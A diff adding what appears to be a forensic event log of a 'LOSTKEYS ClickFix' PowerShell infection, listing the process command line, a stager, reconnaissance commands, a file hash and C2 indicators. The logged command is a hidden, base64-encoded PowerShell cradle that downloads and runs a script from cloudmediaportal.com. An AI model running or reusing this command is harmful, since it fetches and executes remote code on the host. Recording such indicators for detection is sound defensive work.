@@ -1,0 +1,21 @@
+[2025-01-15 14:02:11 UTC] EVENT ID 4688: Process Creation Detected
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Command Line: powershell.exe -w hidden -nop -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vY2xvdWRtZWRpYXBvcnRhbC5jb20vcGF5bG9hZC5wczEnKQ==
+Parent Process: C:\Windows\System32\cmd.exe (User ClickFix Paste Action)
+
+[2025-01-15 14:02:15 UTC] DETECTED SCRIPT PAYLOAD (LOSTKEYS ClickFix Lure):
+# PowerShell Stage-1 Stager:
+$u = "http://cloudmediaportal[.]com/connect"
+$ip = "165.227.148[.]68"
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('TE9TVEtFWVMgV0FTOEhFUkU='))
+
+[2025-01-15 14:02:20 UTC] SECONDARY EXECUTION & RECONNAISSANCE:
+Execution of secondary script via wscript.exe:
+- Command Executed: cmd.exe /c ipconfig /all
+- Command Executed: cmd.exe /c tasklist
+- Command Executed: cmd.exe /c net view
+
+[2025-01-15 14:02:30 UTC] FORENSIC ARTIFACT SUMMARY:
+Sample SHA-256 Hash: 28a0596b9c62b7b7aca9cac2a07b067109f27d327581a60e8cb4fab92f8f4fa9
+Malware Family Identifier: GTIG-LOSTKEYS-CLICKFIX-2025
+C2 Beacon Target: cloudmediaportal.com (165.227.148.68)
